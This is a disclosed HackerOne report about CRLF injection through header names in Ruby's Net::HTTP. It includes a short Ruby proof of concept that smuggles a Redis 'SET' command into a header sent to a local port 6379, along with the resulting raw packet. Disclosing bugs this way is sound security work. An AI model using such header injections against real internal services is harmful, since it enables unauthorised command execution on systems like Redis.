# Header CRLF Injection in Ruby Net::HTTP

## Report Details
- **Report ID**: 1718757
- **URL**: https://hackerone.com/reports/1718757
- **State**: Closed
- **Severity**: none
- **Submitted**: 2022-10-01T02:12:04.360Z
- **Disclosed**: 2023-05-04T01:40:31.030Z

## Reporter
- **Username**: leixiao
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
There is a Header CRLF Injection vulnerability in Ruby Net::HTTP.
When I run the following code:
```
require 'net/http'

http = Net::HTTP.new('127.0.0.1', 6379)
headers = {
  "test\r\nSET VULN POC \r\n" => "test",
}
resp, data = http.get("/", headers)
```
The service on port 6379 will receive the following packet:
```
GET / HTTP/1.1
Test
set vuln poc
: test
Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
Accept: */*
User-Agent: Ruby
Connection: close
Host: 127.0.0.1:6379
```
This means that if an attacker can control the header name, he can inject arbitrary content into the HTTP request. This is very dangerous.

## Impact

If port 6379 is running the Redis service, the attacker can directly execute the Redis command. So this vulnerability can be used to attack internal services like Redis etc.
{F1963847}

## Attachments
- image.png
